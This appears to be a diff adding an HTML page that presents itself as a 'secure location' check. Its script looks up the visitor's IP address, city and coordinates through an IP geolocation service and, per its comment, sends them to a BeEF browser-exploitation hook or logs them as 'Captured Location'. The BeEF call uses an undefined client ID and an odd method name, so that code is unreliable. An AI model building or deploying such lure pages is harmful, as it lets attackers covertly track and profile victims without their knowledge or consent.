@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><title>Location Check</title></head>
+<body style="font-family:sans-serif;text-align:center;padding-top:50px;">
+
+<h2>Detecting Your Secure Location...</h2>
+
+<div id="output"></div>
+
+<script src="//ipapi.co/js/v2/npm.js"></script> <!-- Simple helper from ipapi -->
+<script>
+    // Try IP-based lookup first (works everywhere)
+    fetch('https://ipapi.co/json/') 
+        .then(res => res.json())
+        .then(data => {
+            const out = document.getElementById('output');
+            out.innerHTML = `
+                <p><strong>IP:</strong> ${data.ip}</p>
+                <p><strong>City/Region:</strong> ${data.city}, ${data.region_name} (${data.country_code})</p>
+                <p><strong>District/Coords (Approx):</strong> Lat: ${data.latitude}, Lon: ${data.longitude}</p>
+                <small>*Detected via IP Database.</small>`;
+            
+            // Send to beEF if you have a client ID, otherwise just console log for manual check
+            if(typeof beef !== 'undefined') {
+                 beef.panthers[clientID].sendData({ type: "ip_geo", data });
+            } else {
+                 console.log("Captured Location:", data);
+            }
+
+        })
+        .catch(err => document.getElementById('output').innerHTML = "<p>Error loading location (check internet).</p>");
+</script>
+
+</body>
+</html>
